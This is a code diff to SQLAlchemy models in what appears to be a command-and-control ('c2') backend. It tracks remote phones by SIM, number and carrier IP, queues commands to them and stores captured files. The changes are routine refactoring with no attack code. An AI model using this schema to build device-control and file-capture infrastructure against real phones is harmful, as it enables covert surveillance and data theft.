@@ -1,6 +1,7 @@
-from datetime import datetime
 from database import db
-import json
+from datetime import timedelta
+
+from c2.timeutil import utcnow
 
 
 class Device(db.Model):
@@ -24,8 +25,8 @@ class Device(db.Model):
     sim_operator = db.Column(db.String(64))
     phone_number = db.Column(db.String(32))
     carrier_ip = db.Column(db.String(64))
-    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
-    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
+    first_seen = db.Column(db.DateTime, default=utcnow)
+    last_seen = db.Column(db.DateTime, default=utcnow)
     is_online = db.Column(db.Boolean, default=True)
     tags = db.Column(db.String(256), default="")
     notes = db.Column(db.Text, default="")
@@ -37,6 +38,11 @@ class Device(db.Model):
 
     def tag_list(self):
         return [t.strip() for t in (self.tags or "").split(",") if t.strip()]
+
+    def is_stale(self, timeout_seconds: int) -> bool:
+        if not self.last_seen:
+            return True
+        return utcnow() - self.last_seen > timedelta(seconds=timeout_seconds)
 
     def to_dict(self):
         return {
@@ -74,14 +80,16 @@ class Command(db.Model):
     payload = db.Column(db.Text, default="{}")
     status = db.Column(db.String(32), default="pending")
     result = db.Column(db.Text, default="")
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    created_at = db.Column(db.DateTime, default=utcnow)
     delivered_at = db.Column(db.DateTime)
     completed_at = db.Column(db.DateTime)
 
     def args(self):
+        import json
+
         try:
-            return json.loads(self.payload)
-        except Exception:
+            return json.loads(self.payload or "{}")
+        except (ValueError, TypeError):
             return {}
 
     def to_dict(self):
@@ -109,8 +117,18 @@ class CapturedFile(db.Model):
     sha256 = db.Column(db.String(64))
     size_bytes = db.Column(db.Integer, default=0)
     mime_type = db.Column(db.String(128))
-    captured_at = db.Column(db.DateTime, default=datetime.utcnow)
+    captured_at = db.Column(db.DateTime, default=utcnow)
     metadata_json = db.Column(db.Text, default="{}")
+
+    # NB: not named `metadata` — that attribute belongs to SQLAlchemy's
+    # declarative base and shadowing it breaks table construction.
+    def meta(self):
+        import json
+
+        try:
+            return json.loads(self.metadata_json or "{}")
+        except (ValueError, TypeError):
+            return {}
 
     def to_dict(self):
         return {
@@ -124,7 +142,7 @@ class CapturedFile(db.Model):
             "size_bytes": self.size_bytes,
             "mime_type": self.mime_type,
             "captured_at": self.captured_at.isoformat() if self.captured_at else None,
-            "metadata": json.loads(self.metadata_json or "{}"),
+            "metadata": self.meta(),
             "url": f"/api/file/{self.id}/raw",
         }
 
@@ -135,7 +153,7 @@ class LogEntry(db.Model):
     device_id = db.Column(db.Integer, db.ForeignKey("devices.id"))
     level = db.Column(db.String(16), default="info")
     message = db.Column(db.Text)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    created_at = db.Column(db.DateTime, default=utcnow)
 
     def to_dict(self):
         return {
